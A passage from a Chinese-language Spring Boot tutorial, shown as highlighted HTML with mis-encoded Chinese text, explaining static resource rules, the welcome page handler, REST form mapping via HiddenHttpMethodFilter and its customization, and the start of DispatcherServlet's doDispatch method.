class="hljs-comment">#ç¦ç”¨æ‰€æœ‰é™æ€èµ„æºè§„åˆ™</span><br></code></pre></td></tr></table></figure><p>é™æ€èµ„æºè§„åˆ™ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ConfigurationProperties(prefix = &quot;spring.resources&quot;, ignoreUnknownFields = false)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResourceProperties</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String[] CLASSPATH_RESOURCE_LOCATIONS = &#123; <span class="hljs-string">&quot;classpath:/META-INF/resources/&quot;</span>,<br>            <span class="hljs-string">&quot;classpath:/resources/&quot;</span>, <span class="hljs-string">&quot;classpath:/static/&quot;</span>, <span class="hljs-string">&quot;classpath:/public/&quot;</span> &#125;;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Locations of static resources. Defaults to classpath:[/META-INF/resources/,</span><br><span class="hljs-comment">     * /resources/, /static/, /public/].</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> String[] staticLocations = CLASSPATH_RESOURCE_LOCATIONS;<br>    ...<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="æ¬¢è¿é¡µçš„å¤„ç†è§„åˆ™"><a href="#æ¬¢è¿é¡µçš„å¤„ç†è§„åˆ™" class="headerlink" title="æ¬¢è¿é¡µçš„å¤„ç†è§„åˆ™"></a>æ¬¢è¿é¡µçš„å¤„ç†è§„åˆ™</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">...<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebMvcAutoConfiguration</span> &#123;<br>    ...<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EnableWebMvcConfiguration</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DelegatingWebMvcConfiguration</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ResourceLoaderAware</span> &#123;<br>        ...<br><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> WelcomePageHandlerMapping <span class="hljs-title function_">welcomePageHandlerMapping</span><span class="hljs-params">(ApplicationContext applicationContext,</span><br><span class="hljs-params">FormattingConversionService mvcConversionService, ResourceUrlProvider mvcResourceUrlProvider)</span> &#123;<br><span class="hljs-type">WelcomePageHandlerMapping</span> <span class="hljs-variable">welcomePageHandlerMapping</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WelcomePageHandlerMapping</span>(<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplateAvailabilityProviders</span>(applicationContext), applicationContext, getWelcomePage(),<br><span class="hljs-built_in">this</span>.mvcProperties.getStaticPathPattern());<br>welcomePageHandlerMapping.setInterceptors(getInterceptors(mvcConversionService, mvcResourceUrlProvider));<br>welcomePageHandlerMapping.setCorsConfigurations(getCorsConfigurations());<br><span class="hljs-keyword">return</span> welcomePageHandlerMapping;<br>&#125;<br>    <br></code></pre></td></tr></table></figure><p><code>WelcomePageHandlerMapping</code>çš„æ„é€ æ–¹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">WelcomePageHandlerMapping(TemplateAvailabilityProviders templateAvailabilityProviders,<br>                          ApplicationContext applicationContext, Resource welcomePage, String staticPathPattern) &#123;<br>    <span class="hljs-keyword">if</span> (welcomePage != <span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-string">&quot;/**&quot;</span>.equals(staticPathPattern)) &#123;<br>        <span class="hljs-comment">//è¦ç”¨æ¬¢è¿é¡µåŠŸèƒ½ï¼Œå¿…é¡»æ˜¯/**</span><br>        logger.info(<span class="hljs-string">&quot;Adding welcome page: &quot;</span> + welcomePage);<br>        setRootViewName(<span class="hljs-string">&quot;forward:index.html&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (welcomeTemplateExists(templateAvailabilityProviders, applicationContext)) &#123;<br>        <span class="hljs-comment">//è°ƒç”¨Controller /index</span><br>        logger.info(<span class="hljs-string">&quot;Adding welcome page template: index&quot;</span>);<br>        setRootViewName(<span class="hljs-string">&quot;index&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ„é€ æ–¹æ³•å†…çš„ä»£ç ä¹Ÿè§£é‡Šäº†<a href="#">webåœºæ™¯-welcomeä¸faviconåŠŸèƒ½</a>ä¸­é…ç½®<code>static-path-pattern</code>äº†ï¼Œwelcomeé¡µé¢å’Œå°å›¾æ ‡å¤±æ•ˆçš„é—®é¢˜ã€‚</p><h2 id="26ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-Restæ˜ å°„åŠæºç è§£æ"><a href="#26ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-Restæ˜ å°„åŠæºç è§£æ" class="headerlink" title="26ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-Restæ˜ å°„åŠæºç è§£æ"></a>26ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-Restæ˜ å°„åŠæºç è§£æ</h2><h3 id="è¯·æ±‚æ˜ å°„"><a href="#è¯·æ±‚æ˜ å°„" class="headerlink" title="è¯·æ±‚æ˜ å°„"></a>è¯·æ±‚æ˜ å°„</h3><ul><li><p>@xxxMapping;</p><ul><li>@GetMapping</li><li>@PostMapping</li><li>@PutMapping</li><li>@DeleteMapping</li></ul></li><li><p>Resté£æ ¼æ”¯æŒï¼ˆä½¿ç”¨<strong>HTTP</strong>è¯·æ±‚æ–¹å¼åŠ¨è¯æ¥è¡¨ç¤ºå¯¹èµ„æºçš„æ“ä½œï¼‰</p><ul><li>ä»¥å‰ï¼š<ul><li>&#x2F;getUser è·å–ç”¨æˆ·</li><li>&#x2F;deleteUser åˆ é™¤ç”¨æˆ·</li><li>&#x2F;editUser ä¿®æ”¹ç”¨æˆ·</li><li>&#x2F;saveUserä¿å­˜ç”¨æˆ·</li></ul></li><li>ç°åœ¨ï¼š &#x2F;user <ul><li>GET-è·å–ç”¨æˆ·</li><li>DELETE-åˆ é™¤ç”¨æˆ·</li><li>PUT-ä¿®æ”¹ç”¨æˆ·</li><li>POST-ä¿å­˜ç”¨æˆ·</li></ul></li><li>æ ¸å¿ƒFilterï¼›HiddenHttpMethodFilter</li></ul></li><li><p><strong>ç”¨æ³•</strong></p><ul><li>å¼€å¯é¡µé¢è¡¨å•çš„ReståŠŸèƒ½</li><li>é¡µé¢ formçš„å±æ€§method&#x3D;postï¼Œéšè—åŸŸ _method&#x3D;putã€deleteç­‰ï¼ˆå¦‚æœç›´æ¥getæˆ–postï¼Œæ— éœ€éšè—åŸŸï¼‰</li><li>ç¼–å†™è¯·æ±‚æ˜ å°„</li></ul></li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">mvc:</span><br>    <span class="hljs-attr">hiddenmethod:</span><br>      <span class="hljs-attr">filter:</span><br>        <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>   <span class="hljs-comment">#å¼€å¯é¡µé¢è¡¨å•çš„ReståŠŸèƒ½</span><br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/user&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;REST-GETæäº¤&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/user&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;REST-POSTæäº¤&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/user&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;_method&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;DELETE&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;REST-DELETE æäº¤&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/user&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;_method&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;PUT&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;REST-PUTæäº¤&quot;</span><span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/user&quot;)</span><br><span class="hljs-comment">//@RequestMapping(value = &quot;/user&quot;,method = RequestMethod.GET)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getUser</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;GET-å¼ ä¸‰&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">@PostMapping(&quot;/user&quot;)</span><br><span class="hljs-comment">//@RequestMapping(value = &quot;/user&quot;,method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">saveUser</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;POST-å¼ ä¸‰&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">@PutMapping(&quot;/user&quot;)</span><br><span class="hljs-comment">//@RequestMapping(value = &quot;/user&quot;,method = RequestMethod.PUT)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">putUser</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;PUT-å¼ ä¸‰&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">@DeleteMapping(&quot;/user&quot;)</span><br><span class="hljs-comment">//@RequestMapping(value = &quot;/user&quot;,method = RequestMethod.DELETE)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">deleteUser</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;DELETE-å¼ ä¸‰&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>ReståŸç†ï¼ˆè¡¨å•æäº¤è¦ä½¿ç”¨RESTçš„æ—¶å€™ï¼‰<ul><li>è¡¨å•æäº¤ä¼šå¸¦ä¸Š<code>\_method=PUT</code></li><li><strong>è¯·æ±‚è¿‡æ¥è¢«</strong><code>HiddenHttpMethodFilter</code>æ‹¦æˆª<ul><li>è¯·æ±‚æ˜¯å¦æ­£å¸¸ï¼Œå¹¶ä¸”æ˜¯POST<ul><li>è·å–åˆ°<code>\_method</code>çš„å€¼ã€‚</li><li>å…¼å®¹ä»¥ä¸‹è¯·æ±‚ï¼›<strong>PUT</strong>.<strong>DELETE</strong>.<strong>PATCH</strong></li><li><strong>åŸç”Ÿrequestï¼ˆpostï¼‰ï¼ŒåŒ…è£…æ¨¡å¼requesWrapperé‡å†™äº†getMethodæ–¹æ³•ï¼Œè¿”å›çš„æ˜¯ä¼ å…¥çš„å€¼ã€‚</strong></li><li><strong>è¿‡æ»¤å™¨é“¾æ”¾è¡Œçš„æ—¶å€™ç”¨wrapperã€‚ä»¥åçš„æ–¹æ³•è°ƒç”¨getMethodæ˜¯è°ƒç”¨requesWrapperçš„ã€‚</strong></li></ul></li></ul></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HiddenHttpMethodFilter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">OncePerRequestFilter</span> &#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> List&lt;String&gt; ALLOWED_METHODS =<br>Collections.unmodifiableList(Arrays.asList(HttpMethod.PUT.name(),<br>HttpMethod.DELETE.name(), HttpMethod.PATCH.name()));<br><br><span class="hljs-comment">/** Default method parameter: &#123;<span class="hljs-doctag">@code</span> _method&#125;. */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_METHOD_PARAM</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;_method&quot;</span>;<br><br><span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">methodParam</span> <span class="hljs-operator">=</span> DEFAULT_METHOD_PARAM;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Set the parameter name to look for HTTP methods.</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@see</span> #DEFAULT_METHOD_PARAM</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setMethodParam</span><span class="hljs-params">(String methodParam)</span> &#123;<br>Assert.hasText(methodParam, <span class="hljs-string">&quot;&#x27;methodParam&#x27; must not be empty&quot;</span>);<br><span class="hljs-built_in">this</span>.methodParam = methodParam;<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilterInternal</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)</span><br><span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br><br><span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">requestToUse</span> <span class="hljs-operator">=</span> request;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;POST&quot;</span>.equals(request.getMethod()) &amp;&amp; request.getAttribute(WebUtils.ERROR_EXCEPTION_ATTRIBUTE) == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">paramValue</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-built_in">this</span>.methodParam);<br><span class="hljs-keyword">if</span> (StringUtils.hasLength(paramValue)) &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> paramValue.toUpperCase(Locale.ENGLISH);<br><span class="hljs-keyword">if</span> (ALLOWED_METHODS.contains(method)) &#123;<br>requestToUse = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpMethodRequestWrapper</span>(request, method);<br>&#125;<br>&#125;<br>&#125;<br><br>filterChain.doFilter(requestToUse, response);<br>&#125;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Simple &#123;<span class="hljs-doctag">@link</span> HttpServletRequest&#125; wrapper that returns the supplied method for</span><br><span class="hljs-comment"> * &#123;<span class="hljs-doctag">@link</span> HttpServletRequest#getMethod()&#125;.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HttpMethodRequestWrapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServletRequestWrapper</span> &#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">HttpMethodRequestWrapper</span><span class="hljs-params">(HttpServletRequest request, String method)</span> &#123;<br><span class="hljs-built_in">super</span>(request);<br><span class="hljs-built_in">this</span>.method = method;<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getMethod</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.method;<br>&#125;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>Restä½¿ç”¨å®¢æˆ·ç«¯å·¥å…·ã€‚<ul><li>å¦‚PostManå¯ç›´æ¥å‘é€putã€deleteç­‰æ–¹å¼è¯·æ±‚ã€‚</li></ul></li></ul><h2 id="27ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-æ€ä¹ˆæ”¹å˜é»˜è®¤çš„-method"><a href="#27ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-æ€ä¹ˆæ”¹å˜é»˜è®¤çš„-method" class="headerlink" title="27ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-æ€ä¹ˆæ”¹å˜é»˜è®¤çš„_method"></a>27ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-æ€ä¹ˆæ”¹å˜é»˜è®¤çš„_method</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@ConditionalOnWebApplication(type = Type.SERVLET)</span><br><span class="hljs-meta">@ConditionalOnClass(&#123; Servlet.class, DispatcherServlet.class, WebMvcConfigurer.class &#125;)</span><br><span class="hljs-meta">@ConditionalOnMissingBean(WebMvcConfigurationSupport.class)</span><br><span class="hljs-meta">@AutoConfigureOrder(Ordered.HIGHEST_PRECEDENCE + 10)</span><br><span class="hljs-meta">@AutoConfigureAfter(&#123; DispatcherServletAutoConfiguration.class, TaskExecutionAutoConfiguration.class,</span><br><span class="hljs-meta">ValidationAutoConfiguration.class &#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebMvcAutoConfiguration</span> &#123;<br><br>    ...<br>    <br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-meta">@ConditionalOnMissingBean(HiddenHttpMethodFilter.class)</span><br>    <span class="hljs-meta">@ConditionalOnProperty(prefix = &quot;spring.mvc.hiddenmethod.filter&quot;, name = &quot;enabled&quot;, matchIfMissing = false)</span><br>    <span class="hljs-keyword">public</span> OrderedHiddenHttpMethodFilter <span class="hljs-title function_">hiddenHttpMethodFilter</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderedHiddenHttpMethodFilter</span>();<br>    &#125;<br>    <br>    ...<br>&#125;<br>    <br></code></pre></td></tr></table></figure><p><code>@ConditionalOnMissingBean(HiddenHttpMethodFilter.class)</code>æ„å‘³ç€åœ¨æ²¡æœ‰<code>HiddenHttpMethodFilter</code>æ—¶ï¼Œæ‰æ‰§è¡Œ<code>hiddenHttpMethodFilter()</code>ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰filterï¼Œæ”¹å˜é»˜è®¤çš„<code>\_method</code>ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebConfig</span>&#123;<br>    <span class="hljs-comment">//è‡ªå®šä¹‰filter</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> HiddenHttpMethodFilter <span class="hljs-title function_">hiddenHttpMethodFilter</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">HiddenHttpMethodFilter</span> <span class="hljs-variable">methodFilter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HiddenHttpMethodFilter</span>();<br>        methodFilter.setMethodParam(<span class="hljs-string">&quot;_m&quot;</span>);<br>        <span class="hljs-keyword">return</span> methodFilter;<br>    &#125;    <br>&#125;<br></code></pre></td></tr></table></figure><p>å°†<code>\_method</code>æ”¹æˆ<code>_m</code>ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/user&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;_m&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;DELETE&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;REST-DELETE æäº¤&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="28ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-è¯·æ±‚æ˜ å°„åŸç†"><a href="#28ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-è¯·æ±‚æ˜ å°„åŸç†" class="headerlink" title="28ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-è¯·æ±‚æ˜ å°„åŸç†"></a>28ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-è¯·æ±‚æ˜ å°„åŸç†</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205005703527.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>SpringMVCåŠŸèƒ½åˆ†æéƒ½ä» <code>org.springframework.web.servlet.DispatcherServlet</code> -&gt; <code>doDispatch()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">processedRequest</span> <span class="hljs-operator">=</span> request;<br>    <span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">mappedHandler</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">multipartRequestParsed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-type">WebAsyncManager</span> <span class="hljs-variable">asyncManager</span> <span class="hljs-operator">=</span> WebAsyncUtils.getAsyncManager(request);<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">Exception</span> <span class="hljs-variable">dispatchException</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            processedRequest = checkMultipart(request);<br>            multipartRequestParsed = (processedRequest != request);<br><br>            <span class="hljs-comment">// æ‰¾åˆ°å½“å‰è¯·æ±‚ä½¿ç”¨å“ªä¸ªHandlerï¼ˆControllerçš„æ–¹æ³•ï¼‰å¤„ç†</span><br>            mappedHandler = getHandler(processedRequest);<br><br>            <span class="hljs-comment">//HandlerMappingï¼šå¤„ç†å™¨æ˜ 